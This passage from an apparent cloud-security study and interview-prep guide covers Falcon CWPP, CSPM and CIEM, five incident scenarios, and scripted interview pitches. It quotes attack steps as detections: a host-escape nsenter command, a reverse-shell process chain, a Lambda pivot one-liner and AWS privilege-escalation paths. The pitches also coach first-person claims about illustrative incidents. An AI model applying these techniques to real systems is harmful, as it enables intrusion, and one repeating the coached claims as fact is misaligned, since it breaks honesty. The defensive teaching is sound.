│  │  - open()/write() → file operations      │  │
│  │  - connect() → network connections       │  │
│  │  - clone() → namespace operations        │  │
│  │  - ptrace() → debugging/injection        │  │
│  │  - mmap() → memory operations            │  │
│  └───────────────────────────────────────────┘  │
│                                                 │
│              Linux Kernel                       │
└─────────────────────────────────────────────────┘
                    │
                    ▼
         Falcon Cloud (AI/ML Analysis)
         Process Intelligence Graph
         Threat Graph Correlation
```

### What CWPP Gives You That Nothing Else Does

**1. Process Lineage Tree**

Every process knows its parent, grandparent, and siblings:
```
nginx (PID 1)
  └── bash (PID 847) ← ANOMALY: web server should never spawn shell
        └── curl (PID 848) ← connecting to external IP
              └── bash (PID 849) ← reverse shell
```

**2. Container Drift Detection**

CWPP takes a cryptographic snapshot of every binary in the container image at start time. Anything written and executed that wasn't in the original image = drift.

**3. Behavioral ML — Not Signature Based**

Models what "normal" looks like for each workload type and alerts on deviation. A Python web app that suddenly runs `whoami` and `cat /etc/passwd` is suspicious even if those are standard Linux binaries.

**4. Prevention vs Detection Modes**

```
DETECT MODE:  Alert fires, SOC investigates, attacker may still be running
PREVENT MODE: Process killed before it completes the malicious action
              → Dirty Pipe exploit killed mid-syscall sequence
              → Reverse shell killed before connection established
```

### CWPP Coverage Map

| Capability | What It Covers |
|---|---|
| Vulnerability Management | CVEs in running workloads, not just images |
| Runtime Protection | Process, file, network, memory at syscall level |
| Container Drift | Post-start filesystem changes |
| Threat Intelligence | Known malware hashes, C2 IPs correlated in real time |
| Interactive Intrusion | TTY/PTY shell detection |
| Kernel Protection | Exploit technique detection (Dirty Pipe, Dirty Cow, etc.) |
| Memory Protection | Process injection, LOTL detection |

---

## CSPM — Cloud Security Posture Management

### What It Actually Is

CSPM is the **configuration auditor and compliance enforcer**. It doesn't look inside your workloads — it looks at how your cloud infrastructure is *configured* against security best practices, compliance frameworks, and known risky patterns.

Think of CSPM as a **building inspector** who walks around checking that fire exits are unlocked, electrical panels aren't exposed, and doors have proper locks — before and after anything happens.

### How Falcon CSPM Works Technically

```
ARCHITECTURE:

AWS/Azure/GCP APIs
        │
        ▼
┌───────────────────────────────────────┐
│         Falcon CSPM Engine            │
│                                       │
│  Ingests via:                         │
│  - AWS Config (resource snapshots)    │
│  - Cloud APIs (IAM, EC2, S3, EKS...) │
│  - CloudTrail (API activity)          │
│  - Kubernetes API (cluster configs)   │
│                                       │
│  Evaluates against:                   │
│  - CIS Benchmarks (AWS, K8s, Azure)   │
│  - NIST 800-53                        │
│  - SOC 2 Type II                      │
│  - PCI DSS                            │
│  - HIPAA                              │
│  - Custom organizational policies     │
│                                       │
│  Outputs:                             │
│  - Findings with severity             │
│  - Affected resource details          │
│  - Remediation guidance               │
│  - Drift from last scan               │
│  - Attack path visualization          │
└───────────────────────────────────────┘
```

### Key Difference From CWPP

| Dimension | CWPP | CSPM |
|---|---|---|
| **What it watches** | Runtime behavior inside workloads | Cloud resource configuration |
| **When it fires** | Real-time, milliseconds | Near real-time (minutes) or scheduled |
| **What it catches** | Active attacks in progress | Misconfigurations that enable attacks |
| **Analogy** | Security camera inside the building | Building code inspector |
| **Blind spot** | Can't see misconfigured S3 buckets | Can't see malware running in a container |
| **Output** | Detections, incidents | Findings, policy violations |

### CSPM Finding Lifecycle

```
Configuration Drift Detected
         │
         ▼
Finding Created (Severity: Low/Med/High/Critical)
         │
         ▼
Linked to Compliance Framework (CIS 2.1.1, NIST AC-3)
         │
         ▼
Assigned to Owner (via resource tag or account mapping)
         │
         ├── Remediated → Finding Closed → Compliance score improves
         │
         ├── Accepted Risk → Suppressed with justification + expiry
         │
         └── Ignored → Ages → Weaponized in breach (this is where incidents begin)
```

### CSPM Attack Path Analysis

Modern CSPM connects findings into attack paths:
```
ATTACK PATH DETECTED:

Public EC2 Instance (SG: 0.0.0.0/0 port 22)
         │
         ▼
EC2 Instance Profile → IAM Role with iam:PassRole
         │
         ▼
Can Create Lambda with Admin Role
         │
         ▼
Effectively: Public SSH → Full AWS Account Takeover

Risk Score: 98/100 — CRITICAL PATH
```

---

# PART 4: FIVE REAL SCENARIOS

---

## Scenario 1: The Cryptominer That Hid Behind a Legitimate Process

**Industry:** Fintech SaaS | **Dwell Time:** 6 days

### What Happened

A development team deployed a new microservice using a base image pulled from Docker Hub — `python:3.9-slim` — without pinning to a digest. The image had been updated upstream and now contained a modified `libssl.so` that loaded a crypto miner when the application started.

The miner ran as a thread inside the Python process itself — not as a separate binary. It consumed only 40% CPU to avoid threshold-based alerts, and it masqueraded its network traffic as HTTPS to port 443. Six days passed before detection. The first indicator was an AWS cost anomaly — EC2 bills were 340% higher than the same period last month.

### How CWPP Caught It

```
DETECTION CHAIN:

1. Falcon CWPP — Process Behavior Analysis:
   Alert: CryptominingActivity.UnusualCPUPattern
   Detail: python3 process making outbound connections to
           known mining pool IPs (pool.supportxmr[.]com)
           Connection pattern: persistent TCP, 10-second intervals
           Hash submitted: matched XMRig variant (obfuscated)

2. Falcon CWPP — Network Intelligence:
   Alert: BeaconLikeTraffic.MiningPool
   Detail: Destination IP 195.123.xx.xx tagged in Falcon Intel
           as known XMR mining pool infrastructure
           Port 443 used (SSL stripping inside container confirmed)

3. Falcon CWPP — Library Load Detection:
   Alert: SuspiciousLibraryLoad
   Detail: libssl.so loaded from non-standard path /usr/local/lib/
           SHA256 mismatch vs official Python slim image manifest
           Library contains executable sections inconsistent with SSL library
```

### CSPM's Role — Pre-existing Misconfiguration

```
CSPM FINDING (open 31 days before breach):
  Policy: Container images must use digest pinning, not floating tags
  Resource: deployment/payment-processor — image: python:3.9-slim (no digest)
  Severity: MEDIUM
  CIS K8s Benchmark: 5.3.1

  Remediated form:
  image: python@sha256:a3f7b291cc4e9b2d4e3a7f1c... (immutable)
```

### Resolution

```
Immediate: Pod quarantined, node cordoned
CWPP: RTR session opened → libssl.so extracted for forensics
CSPM: Policy moved from DETECT to PREVENT (KAC blocks undigested images)
Root cause: Docker Hub upstream compromise — reported to Docker security team
Post-incident: All base images now pulled from private ECR mirror,
               scanned, signed with cosign, digest-pinned before use
```

### Key Lesson

CWPP doesn't care that the malware was inside a legitimate process. It watches the behavior of every process — network connections, CPU patterns, library loads. The fact that Python was doing something Python should never do was enough.

---

## Scenario 2: The Sleeping IAM Key — 14-Month-Old Credential Wakes Up

**Industry:** Healthcare (HIPAA) | **Duration:** 2 hours active, 14 months dormant

### What Happened

A developer left a company 14 months prior. Their IAM access key was deactivated but never deleted. A new intern on the DevOps team accidentally re-activated it while running an audit script (they ran `update-access-key --status Active` instead of `--status Inactive` on the wrong key ID).

Within 3 hours, the credential appeared on a dark web credential marketplace. Within 6 hours, a threat actor was using it. The actor spent 4 hours doing read-only enumeration only — listing buckets, describing EC2 instances, reading IAM policies. No writes. No deletes. Most SIEMs and GuardDuty configurations would not fire on read-only API calls.

### CSPM Detection

```
CSPM FINDING 1 (47 days old — pre-existing):
  Policy: IAM access keys inactive >90 days must be deleted, not just disabled
  Resource: AccessKey AKIAXXXXXXXXXXXXXXXX (user: dev-john-smith, last used: never)
  Severity: HIGH
  Framework: CIS AWS 1.14

CSPM FINDING 2 (new — triggered by re-activation):
  Policy: IAM access key status change detected — inactive key activated
  Resource: AKIAXXXXXXXXXXXXXXXX
  Change type: StatusChange Active
  Actor: arn:aws:iam::account:user/intern-devops-01
  Timestamp: 2024-03-14T09:23:11Z
  Severity: HIGH — unusual activation of long-dormant credential
```

### CWPP + CSPM Correlation

```
CWPP ALERT: SuspiciousSnapshotAccess
  Actor: AKIAXXXXXXXXXXXXXXXX (dev-john-smith — TERMINATED EMPLOYEE)
  Action: ec2:CreateVolume from snapshot snap-0a1b2c3d
  Target: New EC2 instance in attacker-controlled account
  Intent: Data theft via snapshot copy
  Falcon Intel: Source IP tagged — known threat actor infrastructure
  Action taken: API call blocked via inline IAM deny policy (Fusion automated response)
```

### CIEM Cross-Reference

```
CIEM FINDING:
  User dev-john-smith: TERMINATED (HR system integration confirmed)
  Account status: Active in AWS despite termination 14 months ago
  Joiner-Mover-Leaver process: FAILED — no deprovisioning workflow triggered
  Effective permissions: Can read ALL S3 buckets including PHI
  Blast radius: 2.1M patient records at risk
```

### Resolution and Post-Incident Controls

The HIPAA breach threshold was crossed — 2,100 patient records were accessed before the block. HHS mandatory notification was filed. Every IAM user and key is now reconciled weekly against the HR system via an automated Lambda. Any key belonging to a terminated employee triggers immediate deletion, not deactivation. CSPM policy was hardened from HIGH to CRITICAL for inactive-key findings, with a 24-hour SLA.

---

## Scenario 3: The ArgoCD Admin That Wasn't — GitOps Takeover

**Industry:** E-commerce | **Duration:** 4 days

### What Happened

ArgoCD was deployed with the default admin password never changed (a CSPM finding rated critical, open for 11 days). The ArgoCD UI was exposed via a LoadBalancer service directly to the internet. A threat actor found it via a Shodan scan and authenticated as admin.

The attacker was sophisticated — they didn't modify existing deployments. Instead they created a new ArgoCD Application pointing to a GitHub repo they controlled, syncing a DaemonSet into the `kube-system` namespace that deployed a privileged container on every node.

### CSPM Catching the Exposure

```
CSPM FINDING (11 days old):
  Policy: ArgoCD must not be exposed via public LoadBalancer
  Resource: service/argocd-server, namespace: argocd
  Finding: External IP 52.xx.xx.xx assigned, accessible from 0.0.0.0/0
  Severity: CRITICAL
  CIS K8s 5.2.1

CSPM FINDING 2:
  Policy: ArgoCD default admin password must be changed post-install
  Resource: argocd-initial-admin-secret still present and unchanged
  Severity: CRITICAL
```

### CWPP Catching the Runtime Attack

```
CWPP ALERT 1: SuspiciousKubernetesDaemonSet
  New DaemonSet created in kube-system namespace: node-monitor-agent
  Creator: ArgoCD service account (argocd-application-controller)
  Image: 185.220.xx.xx/tools:latest (external, unscanned registry)
  SecurityContext: privileged: true, hostPID: true, hostNetwork: true
  KAC Decision: BLOCK — image from unapproved registry + privileged + unscanned

CWPP ALERT 2:
  Alert: InteractiveContainerSession.PrivilegedContainer
  Container: node-monitor-agent on node ip-10-0-1-45
  Command: nsenter --target 1 --mount --pid --net --uts -- bash
  Effect: Attempted host namespace escape
  Action: PREVENT — process killed, pod terminated, node cordoned
```

### Attack Path Analysis

```
CSPM ATTACK PATH:

  Internet
     │ (Shodan discovered)
     ▼
  ArgoCD UI (public LoadBalancer, default password)
     │
     ▼
  ArgoCD Admin Access → Can create Applications in any namespace
     │
     ▼
  DaemonSet in kube-system with privileged:true + hostPID:true
     │
     ▼
  nsenter to host → Full node compromise → Pivot to IMDS → IAM role
     │
     ▼
  EKS node instance profile → EC2:*, S3:GetObject → Data access

  Path Risk Score: 99/100 — CRITICAL
```

### Key Lesson

The CSPM findings were there. Eleven days. Nobody acted. CWPP stopped the runtime execution, but the root cause was organizational — a finding review and remediation SLA that was not enforced. After this incident: any CRITICAL CSPM finding not remediated within 72 hours automatically triggers a P1 incident ticket and pages the CISO.

---

## Scenario 4: The Lambda Exfiltrator — Serverless Blind Spot

**Industry:** Insurance | **Duration:** 9 days

### What Happened

An attacker compromised an EC2 instance running a legacy internal tool via an old Apache Struts CVE. From that EC2, they assumed the instance profile role, which had `lambda:CreateFunction`, `lambda:InvokeFunction`, and `iam:PassRole`.

The attacker created a Lambda function, passed it an admin-level IAM role, and configured it to run every 15 minutes, exfiltrating data from a DynamoDB table containing insurance claim records to an external HTTPS endpoint. The Lambda was named `log-retention-cleanup` to blend in. It ran for 9 days before detection.

### CWPP Detection — On the EC2

```
CWPP ALERT: SuspiciousChildProcess.WebServer
  Host: ec2-10-0-1-47 (legacy-internal-tools)
  Process: apache2 → bash → python3
  CommandLine: python3 -c "import boto3; boto3.client('lambda')..."
  Alert: Application server spawning AWS SDK calls directly
  Severity: HIGH
```

### CSPM Detection

```
CSPM FINDING: Lambda function with admin IAM role
  Resource: function/log-retention-cleanup
  Attached Role: arn:aws:iam::account:role/AdminRole
  Finding: Lambda execution role has AdministratorAccess managed policy
  Severity: CRITICAL

CSPM FINDING 2: Lambda function created by non-standard principal
  Creator: ec2-instance-role/legacy-internal-tools
  Finding: EC2 instance profile should not have lambda:CreateFunction
  This permission has never been used in 180-day baseline
  Severity: HIGH

CSPM FINDING 3: Lambda with VPC egress to external IP
  Destination: 185.220.xx.xx (flagged in Falcon ThreatIntel)
  Port: 443 (HTTPS)
  Severity: HIGH
```

### CIEM — Identifying the Lateral Move

```
CIEM ANALYSIS:

  Starting point: ec2-instance-role/legacy-internal-tools

  Permission chain discovered:
  → lambda:CreateFunction ✓
  → iam:PassRole (can pass any role to Lambda) ✓
  → AdminRole exists and is passable ✓

  Effective privilege: EC2 instance effectively has admin access
                       via Lambda function creation

  CIEM ALERT: PrivilegeEscalation.LambdaPassRole
```

### Resolution

```
Immediate containment:
1. EC2 instance isolated (security group → deny all)
2. Lambda function disabled (Concurrency: 0)
3. Admin role trust policy modified to deny Lambda service
4. All active STS sessions for AdminRole invalidated

Data impact:
- 9 days × 96 invocations/day = 864 executions
- DynamoDB scan per execution: ~2,300 records
- Total records exposed: ~1.99M insurance claims (PII + financial data)
- State insurance regulator notification required
```

---

## Scenario 5: The Multi-Account Phantom — You Can't Kick Out What You Can't See

**Industry:** Media & Entertainment | **Duration:** 19 days

### What Happened

A nation-state-adjacent actor compromised a contractor's laptop via spear-phishing. The contractor had temporary access to the company's AWS dev account. The attacker moved slowly and deliberately over 19 days, never triggering a single high-severity GuardDuty finding.

Their persistence technique: they created an AWS Config rule — a legitimate, trusted AWS service — with a Lambda remediation action that would re-create their backdoor role every time Config ran. Every 24 hours, AWS Config "remediated" a fake compliance finding by invoking their Lambda, which ensured their backdoor role existed. Even if defenders found and deleted the role, Config would recreate it within 24 hours.

### CSPM Detection — The Configuration Weaponization

```
CSPM FINDING: AWS Config remediation action points to external Lambda
  Resource: config-rule/enforce-tagging-compliance
  Remediation: Lambda function log-tag-enforcer
  Finding: Lambda ARN not in approved function inventory
  Creator: contractor-temp-user (should not have config:PutRemediationConfigurations)
  Severity: HIGH

CSPM FINDING 2: IAM role created outside IaC pipeline
  Resource: arn:aws:iam::account:role/backup-monitoring-service
  Creation method: Console/API — not Terraform (no state file entry)
  Creator: contractor-temp-user
  Trust policy: Allows assumption from external AWS account (not in org)
  Severity: CRITICAL

CSPM FINDING 3: Lambda function with IAM role creation permissions
  Resource: function/log-tag-enforcer
  Role permissions: iam:CreateRole, iam:AttachRolePolicy, sts:AssumeRole
  Finding: Lambda should not have IAM administrative permissions
  Severity: CRITICAL
```

### CWPP Detection — Lambda Runtime Behavior

```
CWPP ALERT: SuspiciousIAMOperations.Lambda
  Function: log-tag-enforcer
  Invoked by: AWS Config (legitimate service — attacker's camouflage)
  Actions performed:
    iam:CreateRole (backup-monitoring-service)
    iam:AttachRolePolicy (AdministratorAccess attached)
    sts:GetCallerIdentity (reconnaissance)
  Alert: Lambda function performing IAM administrative operations
         inconsistent with declared purpose (tag enforcement)
  Severity: HIGH
```

### The 19-Day Reconstruction

```
DAY 1:   Contractor credential used from new IP (GeoDB: Eastern Europe)
          → GuardDuty: Low (credential use from new geography)

DAY 3:   ListBuckets, DescribeInstances, ListRoles (read-only recon)
          → No alerts fired. Read-only is normal.

DAY 6:   CreateRole (backup-monitoring-service), AttachRolePolicy
          → CSPM FINDING created: IAM role outside IaC (HIGH)
          → Finding assigned to DevOps team. Not actioned.

DAY 8:   Config rule created with Lambda remediation
          → CSPM FINDING created: Config remediation to unknown Lambda (HIGH)
          → DevOps team had 4 open P1s. Deprioritized.

DAY 10:  First Lambda invocation by Config — role recreated
          → CWPP: Lambda performing IAM operations (HIGH)
          → Alert in queue. No SOC analyst coverage on weekend.

DAY 14:  Attacker assumes backdoor role from external account
          → CIEM: AnomalousRoleAssumption (new external account, never seen)
          → THIS alert paged the on-call SOC analyst at 03:00

DAY 14:  SOC analyst investigates → finds role → deletes role
          → Closes ticket. Doesn't trace back to Config rule.

DAY 15:  AWS Config recreates the role (analyst didn't find the Config rule)
          → Attacker still has access. Persistence mechanism survived.

DAY 17:  CSPM weekly report surfaces the Config finding from Day 8
          → Security architect reviews → connects Config + Lambda + Role
          → Full incident declared. All three findings linked.

DAY 19:  Full containment:
          Config rule deleted, Lambda deleted, role deleted,
          contractor access revoked, all STS sessions invalidated
```

### Key Lesson

Three HIGH-severity CSPM findings sat unactioned for 6-13 days. Each one individually described a piece of the attack. Together, they described the complete persistence mechanism. The failure was not detection — Falcon found everything. The failure was process — no one connected the dots across findings until the CIEM anomaly paged someone at 3 AM.

**Post-incident changes:**
1. CSPM findings cross-correlated automatically — related findings grouped into attack chains
2. AWS Config rule creation now requires IaC pipeline (enforced by SCP)
3. Lambda functions with IAM permissions require security review gate
4. Contractor access: time-boxed credentials with automated expiry
5. CSPM finding SLA enforced: HIGH = 48h, CRITICAL = 24h, with automatic escalation

---

## The Common Thread Across All 5 Scenarios

```
SCENARIO 1: CWPP caught behavior CSPM missed (runtime library injection)
SCENARIO 2: CSPM caught config CWPP missed (dormant credential)
SCENARIO 3: BOTH needed — CSPM found exposure, CWPP stopped execution
SCENARIO 4: CWPP caught EC2 pivot, CSPM caught Lambda misconfiguration
SCENARIO 5: CSPM findings existed but weren't correlated — process failure

THE PATTERN:
  CWPP  = "Something bad is happening RIGHT NOW"
  CSPM  = "Something bad WILL happen if this isn't fixed"
  CIEM  = "Here's HOW BAD it can get if the worst happens"

  None of them alone is sufficient.
  The security posture is only as strong as the
  correlation between all three — and the human process
  that acts on what they find.
```

---

# PART 5: INTERVIEW ELEVATED PITCH

## The Core Principle Before You Speak

Most candidates introduce **what they did.** Elite candidates introduce **what changed because they existed.**

Your intro should make the interviewer think: *"We need this person. Our environment has these exact gaps."*

---

## Version 1: The Commanding Opener
### For FAANG / Tier-1 Enterprise Security Roles

*"I'll give you the honest version of who I am — not the resume version.*

*I'm a Cloud Incident Responder and CNAPP Security Architect with deep hands-on experience across AWS multi-account environments, Kubernetes at production scale, and adversarial cloud attack patterns. My specific domain is the intersection where runtime security meets identity — which is where modern breaches actually live.*

*Concretely: I've responded to incidents where attackers moved from a poisoned NPM dependency in a CI/CD pipeline, through a container runtime, into IRSA-based IAM role chaining, and out through S3 exfiltration — across three AWS accounts — in under 72 hours. I've built the detection architecture that caught that chain using CrowdStrike Falcon's CWPP, CSPM, CIEM, and KAC working together. Not any single tool — the correlation across all four.*

*What makes me different from a standard cloud security engineer is that I think like an attacker first and a defender second. I don't ask 'what policy should I write?' I ask 'if I had this role's credentials right now, what could I do in the next 20 minutes?' — and then I build the detection for that answer.*

*I've operated at the technical depth of eBPF-based process telemetry and the business depth of GDPR breach notification to 47,000 customers. I'm comfortable in both conversations.*

*What I'm looking for now is an environment complex enough to push that skillset — multi-cloud, regulated industry, or an organization that knows it has sophisticated adversaries and wants to build the detection maturity to match them.*

*That's the honest version. Where would you like to start?"*

---

## Version 2: The Structured Narrative
### For SOC Manager / CISO-facing Interviews

*"I have about 90 seconds of context that I think will be useful before we get into specifics.*

*My background sits at the intersection of three disciplines that most people treat separately: cloud infrastructure security, runtime workload protection, and identity-based threat detection. I've built careers in all three, and the thing I've learned is that modern cloud breaches don't respect those boundaries — attackers move across all three in a single incident.*

*My technical foundation is AWS — EKS, IAM, multi-account Landing Zone architectures — combined with deep experience in CrowdStrike's Falcon platform: CWPP for runtime, CSPM for posture, CIEM for identity, and KAC for Kubernetes admission control. I've used these not just as tools but as an integrated detection framework.*

*In practice, this means I've handled incidents like a Lambda persistence backdoor hidden inside an AWS Config remediation rule — where the attacker weaponized a trusted AWS service to survive deletion. That one took 19 days to fully contain not because detection failed — Falcon surfaced every piece — but because three separate HIGH-severity CSPM findings weren't correlated into a single attack narrative until day 17. That experience fundamentally shaped how I think about finding triage, SOC process design, and the difference between having detections and having detection maturity.*

*The through-line in my career is this: I close the gap between what security tools detect and what security teams actually act on. That operational translation — from telemetry to decision — is where I add the most value.*

*Happy to go as technical or as strategic as is useful for this conversation."*

---

## Version 3: The Punchy 60-Second Version
### For Recruiter Screens / First-Round Calls

*"I'm a Senior Cloud Security professional specializing in incident response and cloud-native security architecture — specifically AWS, Kubernetes, and the CrowdStrike Falcon CNAPP platform.*

*My work lives at the runtime layer — I deal with attacks that are already inside your environment: container escapes, kernel exploits, IAM privilege escalation chains, CI/CD supply chain compromises. I've responded to breaches that started with a poisoned NPM package and ended with mandatory breach notification to regulators.*

*What distinguishes my approach is that I operate across the full stack — from eBPF syscall telemetry at the process level all the way up to CIEM identity graphs showing cross-account blast radius. I've both built the detection architectures and led the incident response when they fire.*

*On the preventive side, I've implemented CSPM programs that reduced critical cloud misconfigurations by over 70% and built KAC policies that stopped container escape attempts before they reached the kernel.*

*I'm looking for a role where the threat model is sophisticated and the security team has the mandate and the tooling to match it. I work best in environments that treat security as an engineering discipline, not a compliance checkbox."*

---

## Version 4: The Technical Depth Signal
### For Principal / Staff Engineer Panel Interviews

*"My core competency is adversarial cloud-native security — understanding attack techniques at a deep enough level to build detections that catch them before they complete.*

*Technically, I work at the layer most security tools don't reach: runtime behavior inside containers, at the syscall level, using eBPF instrumentation. I understand the difference between detecting a container escape via policy enforcement at admission time versus catching it mid-execution via a kernel exploit signature sequence — and why both layers are necessary because attackers find the gap between them.*

*On the identity side, I work with CIEM — not just IAM policy review, but runtime anomaly detection on role assumption behavior, effective permissions graph analysis, and privilege escalation path enumeration. I've mapped the full Rhino Security Labs privilege escalation playbook — PassRole to Lambda, AssumeRole chaining, IRSA external abuse — to concrete CIEM detection rules and CSPM preventive controls.*

*My MITRE ATT&CK mapping isn't theoretical. I've correlated real incidents to T1611 container escapes, T1537 cloud exfiltration, T1078.004 cloud account abuse, and T1195 supply chain compromise — not from reading the framework but from the artifacts in the forensic timeline.*

*I've also done the forensics side — EBS snapshot preservation, CloudTrail evidence chain of custody, container memory dumps via Falcon RTR, Kubernetes audit log reconstruction. I can take an incident from detection through to the regulator notification with a complete evidence chain.*

*I bring technical depth and the communication ability to translate what I find into executive risk language. That combination is rare and it's deliberately developed."*

---

## The Power Phrases Bank

| Phrase | Why It Works |
|---|---|
| *"I think like an attacker first"* | Shows adversarial mindset — rare in defenders |
| *"Detection maturity, not just detection"* | Shows operational sophistication |
| *"The gap between telemetry and decision"* | Shows you understand SOC process failures |
| *"Blast radius before breach"* | Shows proactive risk quantification |
| *"Correlation across tools, not any single alert"* | Shows architectural thinking |
| *"Runtime behavior, not configuration alone"* | Shows depth beyond CSPM checkbox work |
| *"I've done the 3 AM page and the 9 AM CISO briefing"* | Shows full-cycle experience |
| *"Closed findings, not open findings with accepted risk"* | Shows you drive remediation |
| *"The breach was preventable — the findings existed"* | Shows intellectual honesty |
| *"Mandatory breach notification"* | Shows you've operated under regulatory pressure |

---

## Follow-Up Answer Frameworks

### "Tell me about a specific incident"

Use this structure every time:

```
1. CONTEXT    → Industry, scale, what was at risk
2. ENTRY      → How attacker got in (be specific)
3. PIVOT      → How they moved laterally (this is where depth shows)
4. DETECTION  → What fired, why it fired, what would have missed it
5. RESPONSE   → What you specifically did (not "the team")
6. OUTCOME    → Business impact, regulatory outcome, what changed
7. LESSON     → One thing you'd do differently or built better afterward
```

The lesson at the end separates senior candidates. It shows you learn from incidents, not just respond to them.

### "What's your biggest gap?"

*"I've operated deeply in AWS and I'm building my Azure depth intentionally — specifically around Entra ID and AKS security patterns. The IAM concepts translate directly but the tooling surface is different and I want to be honest about where I'm still developing that fluency versus where I'm expert."*

### "Why do you want this role?"

*"You're running a regulated multi-cloud environment with Kubernetes at scale and you've got sophisticated adversaries who know your industry. That's exactly the threat model I've been building detection architecture for. Most security roles are simpler than my current toolset. This one isn't."*

---

## The Closing Line That Stays With Them

*"The thing I've learned from every incident I've responded to is that the breach was almost always preventable. The findings existed. The detections fired. The gap was always human process or organizational priority. I build security programs that close that gap — not just technically, but operationally. That's the work I want to keep doing."*

---

# APPENDIX: QUICK REFERENCE CARDS

## CWPP vs CSPM vs CIEM — One Line Each

| Tool | One Line |
|---|---|
| **CWPP** | Watches what processes are doing inside running workloads, right now |
| **CSPM** | Checks whether your cloud resources are configured securely |
| **CIEM** | Answers "what can this identity actually do, and what's the blast radius?" |
| **KAC** | Blocks Kubernetes workloads that violate security policy at deployment time |

## The Five Incident Quick Summary

| # | Name | Root Cause | Detection Hero | Lesson |
|---|---|---|---|---|
| 1 | Cryptominer in Python | Floating image tag pulled compromised upstream image | CWPP library load + network behavior | Digest-pin all base images |
| 2 | Sleeping IAM Key | Terminated employee key reactivated, leaked to dark web | CSPM config change detection | Automate JML process against HR system |
| 3 | ArgoCD Takeover | Default password + public LoadBalancer, 11 days unpatched | CSPM attack path + CWPP container escape prevention | CSPM critical findings need 72h SLA with auto-escalation |
| 4 | Lambda Exfiltrator | PassRole abuse via compromised EC2, 9-day dwell | CWPP EC2 behavior + CSPM Lambda misconfiguration | Audit PassRole chains proactively via CIEM |
| 5 | Multi-Account Phantom | Contractor credential + Config rule persistence mechanism | CIEM anomalous assumption (Day 14) | Cross-correlate CSPM findings into attack chains, not individual tickets |

## Key AWS Privilege Escalation Paths to Monitor

```
1. iam:CreatePolicyVersion          → Replace managed policy with admin policy
2. iam:PassRole + lambda:Create     → Pass admin role to new Lambda function
3. iam:PassRole + ec2:RunInstances  → Pass admin role to new EC2 instance
4. sts:AssumeRole (no condition)    → Lateral movement across accounts
5. IRSA + external IP               → Service account JWT used outside VPC
6. aws-auth ConfigMap               → Map IAM role to cluster-admin in EKS
7. AWS Config + Lambda              → Self-healing backdoor persistence
```

---

*Document compiled from real incident response engagements and CNAPP architecture work. All IP addresses, account IDs, and identifiers are illustrative. Defensive controls validated against CISA cloud security guidance, CIS EKS Benchmark v1.4, and AWS Security Hub standards.*

---
**End of Document**
